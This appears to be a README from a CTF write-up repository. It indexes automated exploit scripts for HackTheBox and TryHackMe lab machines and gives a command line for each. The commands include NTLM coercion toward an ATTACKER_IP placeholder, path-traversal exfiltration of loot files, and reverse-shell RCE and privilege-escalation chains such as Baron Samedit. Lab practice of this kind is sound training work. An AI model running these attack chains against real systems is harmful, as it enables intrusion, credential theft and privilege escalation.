# ⚡ Automated Solve & Exploit Scripts (`/autosolve`)

This directory contains standalone, end-to-end automated exploit and solver scripts for HackTheBox machines, TryHackMe challenges, and CTF challenges documented across [Asbawy's Knowledge Vault](https://asbawy.com).

---

## 📌 Inventory of Automated Scripts

| Script Name                                                            | Target / Lab                  |  Language  | Vector / Mechanism                                                                                                                                                                                            | Writeup Link                                                     |
| :--------------------------------------------------------------------- | :---------------------------- | :--------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | :--------------------------------------------------------------- |
| **[`htb_busqueda_solve.py`](./htb_busqueda_solve.py)**                 | HackTheBox - Busqueda         | `Python 3` | Searchor 2.4.0 eval() injection RCE, `.git/config` credential harvesting, SSH password reuse, and relative path hijack of sudo `/opt/scripts/system-checkup.py`.                                              | [Read Writeup](https://asbawy.com/writeups/htb-busqueda)         |
| **[`Ghostlink_scripts/`](./Ghostlink_scripts/)**                       | HackTheBox - Ghostlink        | `Python 3` | Modular exploit toolkit: MQTT NTLM coercion, custom thread-locked HTTP relay bridge, double URL-encoded traversal, KeePass extraction, Gogs CVE-2025-8110 symlink RCE, and ADCS ESC11.                        | [Read Writeup](https://asbawy.com/writeups/htb-ghostlink)        |
| **[`htb_hexecution_solve.py`](./htb_hexecution_solve.py)**             | HackTheBox - Hexecution       | `Python 3` | Automated custom VM (`cook`) assembly (`recipe.asm`) parsing, AES256 bytecode extraction, 2-stage permutation inversion, and full Python VM emulation.                                                        | [Read Writeup](https://asbawy.com/writeups/htb-hexecution)       |
| **[`Jail_scripts/`](./Jail_scripts/)**                                 | HackTheBox - Jail             | `Python 3` | 32-bit stack BOF with DEBUG pointer leak and custom 27-byte `dup2(1,0)` shellcode, NFS `no_all_squash` SUID binary, sudo rvim Python sandbox escape, Atbash decryption, and RSA Wiener attack on 512-bit key. | [Read Writeup](https://asbawy.com/writeups/htb-jail)             |
| **[`htb_neural_detonator_solve.py`](./htb_neural_detonator_solve.py)** | HackTheBox - Neural Detonator | `Python 3` | Automated `.keras` extraction, Lambda layer base64+marshal bytecode disassembly, SHA-1 weight key derivation, and Dense bias stego flag decryption.                                                           | [Read Writeup](https://asbawy.com/writeups/htb-neural-detonator) |
| **[`htb_nexus_solve.py`](./htb_nexus_solve.py)**                       | HackTheBox - Nexus            | `Python 3` | Gitea git history DB credential leak, Krayin CRM TinyMCE file upload RCE, production `.env` password harvest, SSH reuse, and root gitea-template-sync timer traversal via crafted git `..` tree objects.      | [Read Writeup](https://asbawy.com/writeups/htb-nexus)            |
| **[`thm_complimentary_exploit.sh`](./thm_complimentary_exploit.sh)**   | TryHackMe - Complimentary     |   `Bash`   | Frontend JS extraction of Cognito Identity Pool ID, guest identity provisioning, temporary AWS credentials exchange, and DynamoDB flag scanning.                                                              | [Read Writeup](https://asbawy.com/writeups/thm-complimentary)    |
| **[`thm_packed_light_solve.py`](./thm_packed_light_solve.py)**         | TryHackMe - Packed Light      | `Python 3` | PCAP extraction of HTTP C2 payload (`updates.py`), single-character XOR keylogger cryptanalysis, and `hotel_sess_state` cookie decryption.                                                                    | [Read Writeup](https://asbawy.com/writeups/thm-packed-light)     |
| **[`thm_pythonplayground_solve.py`](./thm_pythonplayground_solve.py)** | TryHackMe - Python Playground | `Python 3` | Client-side base-26 decoding, `__import__` blacklist bypass for Docker container root RCE, SSH password reuse, and pure-Python Baron Samedit (CVE-2021-3156) sudo heap overflow for root shell.               | [Read Writeup](https://asbawy.com/writeups/thm-pythonplayground) |

---

## 🚀 Quick Execution Guide

### HackTheBox - Busqueda (`htb_busqueda_solve.py`)

Execute the end-to-end automated exploit against the target IP:

```bash
python3 htb_busqueda_solve.py <TARGET_IP>
```

### HackTheBox - Ghostlink (`Ghostlink_scripts/`)

Follow the multi-stage exploit workflow in [`Ghostlink_scripts/`](./Ghostlink_scripts/):

```bash
# 1. Coerce svc_canary NTLM over MQTT
python3 Ghostlink_scripts/mqtt_trigger.py http://<ATTACKER_IP>/

# 2. Run local relay bridge proxy with ntlmrelayx
# (See Ghostlink_scripts/README.md for bridge installation)

# 3. Exfiltrate loot via double-encoded path traversal
python3 Ghostlink_scripts/traversal_fetch.py '..\..\Documents\Operations\Management\db.zip' loot/db.zip

# 4. Inspect registry hive
python3 Ghostlink_scripts/hive_inspect.py loot/ntuser.dat

# 5. Gogs Symlink RCE (CVE-2025-8110)
python3 Ghostlink_scripts/gogs_symlink_rce.py -u http://gpz-op26-toolkits.ghostlink.htb -U vroth -P '<PASSWORD>' -H <LHOST> -p <LPORT>
```

### HackTheBox - Hexecution (`htb_hexecution_solve.py`)

Run the standalone solver against the challenge bytecode file (`recipe.asm`):

```bash
python3 htb_hexecution_solve.py -f recipe.asm
# Or verify execution with the local cook VM binary:
python3 htb_hexecution_solve.py -f recipe.asm --bin ./cook
```

### HackTheBox - Jail (`Jail_scripts/`)

Execute the port 7411 stack buffer overflow or run the privilege escalation helper:

```bash
# 1. Trigger stack BOF for remote shell as nobody
python3 Jail_scripts/breakout.py <TARGET_IP>

# 2. Escape sudo rvim to adm
python3 Jail_scripts/adm_pick.py "id; cat /var/adm/.keys/.local/.frank"

# 3. Extract root key from keys.rar & run RSA Wiener attack
# (See Jail_scripts/README.md for full multi-stage details)
```

### HackTheBox - Neural Detonator (`htb_neural_detonator_solve.py`)

Run the standalone solver against the challenge model file (`mlcious.keras`):

```bash
python3 htb_neural_detonator_solve.py mlcious.keras
```

### HackTheBox - Nexus (`htb_nexus_solve.py`)

Execute the end-to-end automated exploit against the target IP:

```bash
python3 htb_nexus_solve.py <TARGET_IP>
```

### TryHackMe - Complimentary (`thm_complimentary_exploit.sh`)

Execute the unauthenticated AWS Cognito IAM abuse script against the target IP or domain:

```bash
chmod +x thm_complimentary_exploit.sh
./thm_complimentary_exploit.sh <TARGET_IP>
```

### TryHackMe - Packed Light (`thm_packed_light_solve.py`)

Run the automated PCAP extractor and XOR decryptor against the challenge capture file:

```bash
python3 thm_packed_light_solve.py -f capture.pcapng
```

### TryHackMe - Python Playground (`thm_pythonplayground_solve.py`)

Execute the complete multi-stage automated exploit (client-side base-26 decode, container root sandbox escape, SSH pivot, and Baron Samedit privilege escalation):

```bash
python3 thm_pythonplayground_solve.py <TARGET_IP>
```
